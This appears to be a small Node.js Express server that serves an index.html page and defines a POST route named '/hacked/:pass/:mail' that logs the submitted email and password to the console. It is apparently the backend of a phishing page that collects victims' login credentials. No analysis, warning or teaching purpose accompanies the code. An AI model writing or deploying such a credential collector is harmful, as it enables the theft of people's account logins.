const express = require("express");
const app = express();
const path = require("path");

app.get("/", function (req, res) {
  res.sendFile(path.join(__dirname, "index.html"));
});

const PORT = 3040;

app.post("/hacked/:pass/:mail", (req, res) => {
  let { mail, pass } = req.params;

  console.log(`Mail: ${mail} Pass: ${pass}`);
});
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
